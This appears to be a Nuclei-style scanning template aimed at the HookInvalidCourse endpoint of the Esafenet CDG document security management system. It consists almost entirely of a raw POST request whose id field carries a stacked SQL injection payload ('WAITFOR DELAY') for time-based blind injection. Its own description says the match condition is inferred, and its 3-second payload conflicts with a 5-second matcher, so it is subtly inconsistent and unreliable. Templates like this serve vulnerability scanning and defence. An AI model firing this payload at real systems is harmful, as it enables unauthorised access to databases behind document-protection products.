id: poc-df675946f08fc2863f13
info:
  name: 亿赛通电子文档安全管理系统HookInvalidCourse存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2025
http:
- raw:
  - 'POST /CDGServer3/system/HookInvalidCourse;loginService HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36


    command=DelHookInvalidCourse&id=1'';WAITFOR DELAY ''0:0:3''--'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
